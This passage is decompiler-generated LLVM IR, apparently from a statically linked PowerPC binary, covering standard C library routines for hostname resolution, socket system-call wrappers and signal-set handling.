  store i32 %v1_1000a96c, i32* %r0.global-to-local, align 4
  %v0_1000a970 = load i32, i32* @r30, align 4
  %v1_1000a970 = add i32 %v0_1000a970, 4
  store i32 %v1_1000a970, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000a97c = inttoptr i32 %v1_1000a970 to i32*
  store i32 %v0_1000a970, i32* %v3_1000a97c, align 4
  %v0_1000a980 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a980 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000a980 = add i32 %v1_1000a980, 4
  %v3_1000a980 = inttoptr i32 %v2_1000a980 to i32*
  store i32 %v0_1000a980, i32* %v3_1000a980, align 4
  %tmp31 = icmp ult i32 %v1_1000a96c, 32
  br i1 %tmp31, label %dec_label_pc_1000abc4, label %dec_label_pc_1000a988

dec_label_pc_1000a988:                            ; preds = %dec_label_pc_1000a96c
  %v0_1000a988 = load i32, i32* @r29, align 4
  %v1_1000a988 = add i32 %v0_1000a988, -44
  %tmp32 = icmp ult i32 %v1_1000a988, 256
  br i1 %tmp32, label %dec_label_pc_1000abc4, label %dec_label_pc_1000a994

dec_label_pc_1000a994:                            ; preds = %dec_label_pc_1000a988
  %v0_1000a994 = load i32, i32* @r30, align 4
  %v1_1000a994 = add i32 %v0_1000a994, 44
  store i32 %v1_1000a994, i32* @r31, align 4
  %v0_1000a998 = load i32, i32* @r23, align 4
  store i32 %v0_1000a998, i32* @r4, align 4
  %v1_1000a9a0 = add i32 %v0_1000a994, 12
  store i32 %v1_1000a9a0, i32* %r21.global-to-local, align 4
  store i32 %v1_1000a994, i32* %r3.global-to-local, align 4
  store i32 268478892, i32* @lr, align 4
  %v3_1000a9a8 = call i32 @strncpy(i32 %v1_1000a994, i32 %v0_1000a998, i32 %v1_1000a988)
  %v0_1000a9ac = load i32, i32* @r31, align 4
  %v1_1000a9ac = load i32, i32* @r30, align 4
  %v2_1000a9ac = add i32 %v1_1000a9ac, 12
  %v3_1000a9ac = inttoptr i32 %v2_1000a9ac to i32*
  store i32 %v0_1000a9ac, i32* %v3_1000a9ac, align 4
  %v0_1000a9b0 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a9b0 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000a9b0 = add i32 %v1_1000a9b0, 4
  %v3_1000a9b0 = inttoptr i32 %v2_1000a9b0 to i32*
  store i32 %v0_1000a9b0, i32* %v3_1000a9b0, align 4
  %v0_1000a9b4 = load i32, i32* @r23, align 4
  store i32 %v0_1000a9b4, i32* %r3.global-to-local, align 4
  %v0_1000a9b8 = load i32, i32* @r30, align 4
  store i32 %v0_1000a9b8, i32* @r4, align 4
  store i32 268478912, i32* @lr, align 4
  %v2_1000a9bc = inttoptr i32 %v0_1000a9b4 to i8*
  %v3_1000a9bc = call i32 @inet_aton(i8* %v2_1000a9bc)
  store i32 %v3_1000a9bc, i32* %r3.global-to-local, align 4
  store i32 %v3_1000a9bc, i32* %r22.global-to-local, align 4
  %v3_1000a9c0 = icmp eq i32 %v3_1000a9bc, 0
  br i1 %v3_1000a9c0, label %dec_label_pc_1000a9f4, label %dec_label_pc_1000a9c8

dec_label_pc_1000a9c8:                            ; preds = %dec_label_pc_1000a994
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000a9d0 = load i32, i32* @r26, align 4
  %v2_1000a9d0 = add i32 %v1_1000a9d0, 8
  %v3_1000a9d0 = inttoptr i32 %v2_1000a9d0 to i32*
  store i32 2, i32* %v3_1000a9d0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000a9d8 = load i32, i32* @r31, align 4
  %v1_1000a9d8 = load i32, i32* @r26, align 4
  %v2_1000a9d8 = inttoptr i32 %v1_1000a9d8 to i32*
  store i32 %v0_1000a9d8, i32* %v2_1000a9d8, align 4
  %v0_1000a9dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a9dc = load i32, i32* @r26, align 4
  %v2_1000a9dc = add i32 %v1_1000a9dc, 12
  %v3_1000a9dc = inttoptr i32 %v2_1000a9dc to i32*
  store i32 %v0_1000a9dc, i32* %v3_1000a9dc, align 4
  %v0_1000a9e0 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a9e0 = load i32, i32* @r26, align 4
  %v2_1000a9e0 = add i32 %v1_1000a9e0, 16
  %v3_1000a9e0 = inttoptr i32 %v2_1000a9e0 to i32*
  store i32 %v0_1000a9e0, i32* %v3_1000a9e0, align 4
  %v0_1000a9e4 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000a9e4 = load i32, i32* @r26, align 4
  %v2_1000a9e4 = add i32 %v1_1000a9e4, 4
  %v3_1000a9e4 = inttoptr i32 %v2_1000a9e4 to i32*
  store i32 %v0_1000a9e4, i32* %v3_1000a9e4, align 4
  %v0_1000a9e8 = load i32, i32* @r26, align 4
  %v1_1000a9e8 = load i32, i32* @r20, align 4
  %v2_1000a9e8 = inttoptr i32 %v1_1000a9e8 to i32*
  store i32 %v0_1000a9e8, i32* %v2_1000a9e8, align 4
  %v0_1000a9ec = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a9ec = load i32, i32* @r24, align 4
  %v2_1000a9ec = inttoptr i32 %v1_1000a9ec to i32*
  store i32 %v0_1000a9ec, i32* %v2_1000a9ec, align 4
  br label %dec_label_pc_1000abc8

dec_label_pc_1000a9f4:                            ; preds = %dec_label_pc_1000a994
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268478972, i32* @lr, align 4
  %v0_1000a9f8 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_100249b0.604 to i32), i32* %r29.global-to-local, align 4
  %v2_1000aa00 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000aa00, i32* %r28.global-to-local, align 4
  store i32 %v2_1000aa00, i32* @r3, align 4
  %v0_1000aa14 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_100249b0.604 to i32), i32* %r3.global-to-local, align 4
  %v0_1000aa1c = call i32 @__pthread_return_0()
  %v3_1000aa24 = load i32, i32* @global_var_10024a94.605, align 4
  store i32 %v3_1000aa24, i32* %r29.global-to-local, align 4
  store i32 %v2_1000aa00, i32* @r3, align 4
  %v0_1000aa30 = call i32 @__pthread_return_void()
  %v0_1000aa38 = load i32, i32* @r23, align 4
  store i32 %v0_1000aa38, i32* %r3.global-to-local, align 4
  %v2_1000aa48 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000aa4c = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000aa50 = load i32, i32* %r22.global-to-local, align 4
  store i32 268479072, i32* @lr, align 4
  %v6_1000aa5c = inttoptr i32 %v0_1000aa38 to i8*
  %v7_1000aa5c = call i32 @__dns_lookup(i8* %v6_1000aa5c, i32 1, i32 %v3_1000aa24, i32 ptrtoint (i32* @global_var_1002ad90.606 to i32), i32 %v2_1000aa48, i32 %v2_1000aa4c)
  store i32 %v7_1000aa5c, i32* %r3.global-to-local, align 4
  %v1_1000aa60 = icmp slt i32 %v7_1000aa5c, 0
  br i1 %v1_1000aa60, label %dec_label_pc_1000aba8, label %dec_label_pc_1000aa68

dec_label_pc_1000aa68:                            ; preds = %dec_label_pc_1000a9f4
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000aa70 = add i32 %tmp19, 4
  %v2_1000aa74 = mul i32 %v0_1000aa50, %v1_1000aa70
  %v1_1000aa78 = add i32 %v2_1000aa74, 256
  %v1_1000aa7c = load i32, i32* @r27, align 4
  %v3_1000aa7c = icmp ugt i32 %v1_1000aa78, %v1_1000aa7c
  br i1 %v3_1000aa7c, label %dec_label_pc_1000aa84, label %dec_label_pc_1000aaa0

dec_label_pc_1000aa84:                            ; preds = %dec_label_pc_1000aa68
  %v3_1000aa84 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000aa84, i32* @r3, align 4
  store i32 268479116, i32* @lr, align 4
  %v0_1000aa88 = call i32 @free()
  %v3_1000aa8c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000aa8c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aa94.607 to i32), i32* @lr, align 4
  %v0_1000aa90 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000aa98 = load i32, i32* @r19, align 4
  %v1_1000aa98 = load i32, i32* @r24, align 4
  %v2_1000aa98 = inttoptr i32 %v1_1000aa98 to i32*
  store i32 %v0_1000aa98, i32* %v2_1000aa98, align 4
  br label %dec_label_pc_1000abc8

dec_label_pc_1000aaa0:                            ; preds = %dec_label_pc_1000aa68
  %v3_1000aaa0 = icmp eq i32 %v0_1000aa50, 0
  br i1 %v3_1000aaa0, label %dec_label_pc_1000aaa0.dec_label_pc_1000ab44_crit_edge, label %dec_label_pc_1000aaa8

dec_label_pc_1000aaa0.dec_label_pc_1000ab44_crit_edge: ; preds = %dec_label_pc_1000aaa0
  %v0_1000ab4c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ab44

dec_label_pc_1000aaa8:                            ; preds = %dec_label_pc_1000aaa0
  %v2_1000aaa8 = mul i32 %v0_1000aa50, %tmp19
  store i32 %v2_1000aaa8, i32* @r5, align 4
  %v0_1000aaac = load i32, i32* @r30, align 4
  %v1_1000aaac = add i32 %v0_1000aaac, 36
  store i32 %v1_1000aaac, i32* %r3.global-to-local, align 4
  %v0_1000aab0 = load i32, i32* @r31, align 4
  store i32 268479160, i32* @lr, align 4
  %v2_1000aab4 = call i32 @memmove(i32 %v1_1000aaac, i32 %v0_1000aab0)
  store i32 %v2_1000aab4, i32* %r3.global-to-local, align 4
  store i32 %v2_1000aaa8, i32* %r0.global-to-local, align 4
  %v0_1000aac4 = load i32, i32* @r30, align 4
  %v1_1000aac4 = load i32, i32* @r31, align 4
  %v3_1000aac4 = add i32 %v1_1000aac4, %v2_1000aaa8
  %v4_1000aac4 = inttoptr i32 %v3_1000aac4 to i32*
  store i32 %v0_1000aac4, i32* %v4_1000aac4, align 4
  %v0_1000aac8 = load i32, i32* @r31, align 4
  %v1_1000aac8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000aac8 = add i32 %v1_1000aac8, %v0_1000aac8
  store i32 %v2_1000aac8, i32* @r25, align 4
  %v1_1000aad0 = add i32 %v0_1000aa50, -1
  store i32 %v1_1000aad0, i32* %r11.global-to-local, align 4
  %v1_1000aad4 = add i32 %v0_1000aa50, 1
  %v2_1000aad8 = icmp sgt i32 %v1_1000aad0, -1
  store i32 %v1_1000aad4, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000aad8, label %dec_label_pc_1000ab08.preheader, label %dec_label_pc_1000aae4

dec_label_pc_1000aae4:                            ; preds = %dec_label_pc_1000aaa8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ab08.preheader

dec_label_pc_1000ab08.preheader:                  ; preds = %dec_label_pc_1000aae4, %dec_label_pc_1000aaa8
  %v0_1000ab106 = phi i32 [ 1, %dec_label_pc_1000aae4 ], [ %v1_1000aad4, %dec_label_pc_1000aaa8 ]
  %v1_1000ab083 = mul i32 %v1_1000aad0, 4
  store i32 %v1_1000ab083, i32* %r0.global-to-local, align 4
  %v2_1000ab0c5 = add i32 %v2_1000aac8, %v1_1000ab083
  %v1_1000ab107 = add i32 %v0_1000ab106, -1
  store i32 %v1_1000ab107, i32* %ctr.global-to-local, align 4
  %v2_1000ab108 = icmp eq i32 %v1_1000ab107, 0
  br i1 %v2_1000ab108, label %dec_label_pc_1000ab14, label %dec_label_pc_1000aaf0

dec_label_pc_1000aaf0:                            ; preds = %dec_label_pc_1000ab08.preheader, %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge
  %v1_1000ab04 = phi i32 [ %v2_1000ab0c, %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge ], [ %v2_1000ab0c5, %dec_label_pc_1000ab08.preheader ]
  %v0_1000aafc = phi i32 [ %v0_1000aafc.pre, %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge ], [ %v0_1000aac8, %dec_label_pc_1000ab08.preheader ]
  %v0_1000aaf4 = phi i32 [ %v0_1000ab08, %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge ], [ %v1_1000aad0, %dec_label_pc_1000ab08.preheader ]
  %v2_1000aaf4 = mul i32 %v0_1000aaf4, %tmp19
  %v1_1000aaf8 = add i32 %v0_1000aaf4, -1
  store i32 %v1_1000aaf8, i32* %r11.global-to-local, align 4
  %v2_1000aafc = add i32 %v0_1000aafc, -8
  %v1_1000ab00 = add i32 %v2_1000aafc, %v2_1000aaf4
  %v2_1000ab04 = add i32 %v1_1000ab04, 4
  %v3_1000ab04 = inttoptr i32 %v2_1000ab04 to i32*
  store i32 %v1_1000ab00, i32* %v3_1000ab04, align 4
  %v0_1000ab08 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ab08 = mul i32 %v0_1000ab08, 4
  store i32 %v1_1000ab08, i32* %r0.global-to-local, align 4
  %v1_1000ab0c = load i32, i32* @r25, align 4
  %v0_1000ab10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ab10 = add i32 %v0_1000ab10, -1
  store i32 %v1_1000ab10, i32* %ctr.global-to-local, align 4
  %v2_1000ab10 = icmp eq i32 %v1_1000ab10, 0
  br i1 %v2_1000ab10, label %dec_label_pc_1000ab14, label %dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge

dec_label_pc_1000aaf0.dec_label_pc_1000aaf0_crit_edge: ; preds = %dec_label_pc_1000aaf0
  %v2_1000ab0c = add i32 %v1_1000ab0c, %v1_1000ab08
  %v0_1000aafc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000aaf0

dec_label_pc_1000ab14:                            ; preds = %dec_label_pc_1000aaf0, %dec_label_pc_1000ab08.preheader
  %v1_1000ab20 = phi i32 [ %v2_1000aac8, %dec_label_pc_1000ab08.preheader ], [ %v1_1000ab0c, %dec_label_pc_1000aaf0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000ab1c = mul i32 %v0_1000aa50, 4
  %v2_1000ab20 = add i32 %v1_1000ab1c, 4
  %v2_1000ab24 = add i32 %v2_1000ab20, %v1_1000ab20
  %v3_1000ab24 = inttoptr i32 %v2_1000ab24 to i32*
  store i32 0, i32* %v3_1000ab24, align 4
  %v0_1000ab30 = load i32, i32* @r25, align 4
  %v2_1000ab30 = add i32 %v0_1000ab30, %v1_1000ab1c
  store i32 %v2_1000ab30, i32* %r11.global-to-local, align 4
  %v1_1000ab34 = load i32, i32* @r31, align 4
  %v2_1000ab34 = sub i32 %v1_1000ab34, %v2_1000ab30
  %v1_1000ab38 = add i32 %v2_1000ab30, 8
  store i32 %v1_1000ab38, i32* @r31, align 4
  %v0_1000ab3c = load i32, i32* @r27, align 4
  %v2_1000ab3c = add i32 %v0_1000ab3c, %v2_1000ab34
  %v1_1000ab40 = add i32 %v2_1000ab3c, -8
  br label %dec_label_pc_1000ab44

dec_label_pc_1000ab44:                            ; preds = %dec_label_pc_1000aaa0.dec_label_pc_1000ab44_crit_edge, %dec_label_pc_1000ab14
  %v0_1000ab4c = phi i32 [ %v0_1000ab4c.pre, %dec_label_pc_1000aaa0.dec_label_pc_1000ab44_crit_edge ], [ %v1_1000ab38, %dec_label_pc_1000ab14 ]
  %v0_1000ab48 = phi i32 [ %v1_1000aa7c, %dec_label_pc_1000aaa0.dec_label_pc_1000ab44_crit_edge ], [ %v1_1000ab40, %dec_label_pc_1000ab14 ]
  %v3_1000ab44 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000ab44, i32* @r4, align 4
  store i32 %v0_1000ab4c, i32* %r3.global-to-local, align 4
  store i32 268479316, i32* @lr, align 4
  %v3_1000ab50 = call i32 @strncpy(i32 %v0_1000ab4c, i32 %v3_1000ab44, i32 %v0_1000ab48)
  %v3_1000ab54 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000ab54, i32* @r3, align 4
  store i32 268479324, i32* @lr, align 4
  %v0_1000ab58 = call i32 @free()
  store i32 %v0_1000ab58, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000ab60 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000ab60, label %dec_label_pc_1000ab68, label %dec_label_pc_1000abb0

dec_label_pc_1000ab68:                            ; preds = %dec_label_pc_1000ab44
  store i32 4, i32* @r5, align 4
  %v0_1000ab70 = load i32, i32* @r30, align 4
  store i32 %v0_1000ab70, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000ab78.608 to i32), i32* @lr, align 4
  %v0_1000ab74 = call i32 @memcpy()
  %v1_1000ab7c = load i32, i32* @r26, align 4
  %v2_1000ab7c = add i32 %v1_1000ab7c, 8
  %v3_1000ab7c = inttoptr i32 %v2_1000ab7c to i32*
  store i32 2, i32* %v3_1000ab7c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000ab84 = load i32, i32* @r26, align 4
  %v2_1000ab84 = add i32 %v1_1000ab84, 12
  %v3_1000ab84 = inttoptr i32 %v2_1000ab84 to i32*
  store i32 4, i32* %v3_1000ab84, align 4
  %v0_1000ab88 = load i32, i32* @r31, align 4
  %v1_1000ab88 = load i32, i32* @r26, align 4
  %v2_1000ab88 = inttoptr i32 %v1_1000ab88 to i32*
  store i32 %v0_1000ab88, i32* %v2_1000ab88, align 4
  %v0_1000ab8c = load i32, i32* @r25, align 4
  %v1_1000ab8c = load i32, i32* @r26, align 4
  %v2_1000ab8c = add i32 %v1_1000ab8c, 16
  %v3_1000ab8c = inttoptr i32 %v2_1000ab8c to i32*
  store i32 %v0_1000ab8c, i32* %v3_1000ab8c, align 4
  %v0_1000ab90 = load i32, i32* @r21, align 4
  %v1_1000ab90 = load i32, i32* @r26, align 4
  %v2_1000ab90 = add i32 %v1_1000ab90, 4
  %v3_1000ab90 = inttoptr i32 %v2_1000ab90 to i32*
  store i32 %v0_1000ab90, i32* %v3_1000ab90, align 4
  %v3_1000ab94 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000ab94, i32* @r3, align 4
  store i32 268479388, i32* @lr, align 4
  %v0_1000ab98 = call i32 @free()
  store i32 %v0_1000ab98, i32* %r3.global-to-local, align 4
  %v0_1000ab9c = load i32, i32* @r26, align 4
  %v1_1000ab9c = load i32, i32* @r20, align 4
  %v2_1000ab9c = inttoptr i32 %v1_1000ab9c to i32*
  store i32 %v0_1000ab9c, i32* %v2_1000ab9c, align 4
  br label %dec_label_pc_1000aba8

dec_label_pc_1000aba8:                            ; preds = %dec_label_pc_1000abb0, %dec_label_pc_1000a9f4, %dec_label_pc_1000ab68
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000ab68 ], [ 2, %dec_label_pc_1000a9f4 ], [ 2, %dec_label_pc_1000abb0 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000ab68 ], [ 1, %dec_label_pc_1000a9f4 ], [ 1, %dec_label_pc_1000abb0 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000aba8 = load i32, i32* @r24, align 4
  %v2_1000aba8 = inttoptr i32 %v1_1000aba8 to i32*
  store i32 %storemerge, i32* %v2_1000aba8, align 4
  br label %dec_label_pc_1000abc8

dec_label_pc_1000abb0:                            ; preds = %dec_label_pc_1000ab44
  %v3_1000abb0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000abb0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000abb8.609 to i32), i32* @lr, align 4
  %v0_1000abb4 = call i32 @free()
  store i32 %v0_1000abb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000aba8

dec_label_pc_1000abc4:                            ; preds = %dec_label_pc_1000a988, %dec_label_pc_1000a96c, %dec_label_pc_1000a960, %dec_label_pc_1000a950, %dec_label_pc_1000a940
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000abc8

dec_label_pc_1000abc8:                            ; preds = %dec_label_pc_1000a924, %dec_label_pc_1000a91c, %dec_label_pc_1000a8d0, %entry, %dec_label_pc_1000aa84, %dec_label_pc_1000a9c8, %dec_label_pc_1000aba8, %dec_label_pc_1000abc4
  store i32 %v0_1000a89c, i32* %r0.global-to-local, align 4
  %v0_1000abd8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000abd8

; uselistorder directives
  uselistorder i32 %v0_1000ab4c, { 1, 0 }
  uselistorder i32 %v1_1000ab1c, { 1, 0 }
  uselistorder i32 %v1_1000ab10, { 1, 0 }
  uselistorder i32 %v1_1000ab08, { 1, 0 }
  uselistorder i32 %v0_1000aaf4, { 1, 0 }
  uselistorder i32 %v1_1000ab083, { 1, 0 }
  uselistorder i32 %v1_1000aad0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000aac8, { 1, 0, 2 }
  uselistorder i32 %v0_1000aa50, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000a994, { 1, 0, 2 }
  uselistorder i32 %v0_1000a950.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000a938, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 19, 20, 21, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1 }
  uselistorder i32* %r0.global-to-local, { 18, 0, 1, 2, 3, 4, 19, 7, 5, 6, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000abc8, { 7, 6, 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000aba8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ab44, { 1, 0 }
  uselistorder label %dec_label_pc_1000aaf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a950, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000abf0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479488, i32* @lr, align 4
  %v2_1000abfc = call i32 @__socketcall(i32 3, i32 %v2_1000abf0)
  ret i32 %v2_1000abfc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ac24 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479540, i32* @lr, align 4
  %v2_1000ac30 = call i32 @__socketcall(i32 6, i32 %v2_1000ac24)
  ret i32 %v2_1000ac30

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ac58 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479600, i32* @lr, align 4
  %v2_1000ac6c = call i32 @__socketcall(i32 15, i32 %v2_1000ac58)
  ret i32 %v2_1000ac6c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ac94 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479656, i32* @lr, align 4
  %v2_1000aca4 = call i32 @__socketcall(i32 10, i32 %v2_1000ac94)
  ret i32 %v2_1000aca4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000accc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479712, i32* @lr, align 4
  %v2_1000acdc = call i32 @__socketcall(i32 9, i32 %v2_1000accc)
  ret i32 %v2_1000acdc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ad04 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479776, i32* @lr, align 4
  %v2_1000ad1c = call i32 @__socketcall(i32 11, i32 %v2_1000ad04)
  ret i32 %v2_1000ad1c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ad44 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479836, i32* @lr, align 4
  %v2_1000ad58 = call i32 @__socketcall(i32 14, i32 %v2_1000ad44)
  ret i32 %v2_1000ad58

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ad80 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479888, i32* @lr, align 4
  %v2_1000ad8c = call i32 @__socketcall(i32 1, i32 %v2_1000ad80)
  ret i32 %v2_1000ad8c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 1, 6, 0, 3, 5, 7, 4 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000add0, label %dec_label_pc_1000adbc

dec_label_pc_1000adbc:                            ; preds = %entry
  %v0_1000adbc = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000adc8 = inttoptr i32 %v0_1000adbc to i32*
  store i32 22, i32* %v2_1000adc8, align 4
  %v0_1000addc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000add8

dec_label_pc_1000add0:                            ; preds = %entry
  %v0_1000add0 = call i32 @__sigaddset()
  store i32 %v0_1000add0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000add8

dec_label_pc_1000add8:                            ; preds = %dec_label_pc_1000adbc, %dec_label_pc_1000add0
  %v0_1000addc = phi i32 [ %v0_1000addc.pre, %dec_label_pc_1000adbc ], [ %v0_1000add0, %dec_label_pc_1000add0 ]
  ret i32 %v0_1000addc

; uselistorder directives
  uselistorder label %dec_label_pc_1000add8, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268480004, i32* @lr, align 4
  %v3_1000ae00 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000ae18 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ae18, label %dec_label_pc_1000ae44, label %dec_label_pc_1000ae34

dec_label_pc_1000ae34:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000ae44, label %dec_label_pc_1000ae3c

dec_label_pc_1000ae3c:                            ; preds = %dec_label_pc_1000ae34
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000ae74.lr.ph, label %dec_label_pc_1000ae44

dec_label_pc_1000ae44:                            ; preds = %dec_label_pc_1000ae3c, %dec_label_pc_1000ae34, %entry
  %v0_1000ae44 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ae50 = inttoptr i32 %v0_1000ae44 to i32*
  store i32 22, i32* %v2_1000ae50, align 4
  %v0_1000aee4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aee0

dec_label_pc_1000ae74.lr.ph:                      ; preds = %dec_label_pc_1000ae3c
  %v2_1000ae64 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000ae64, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
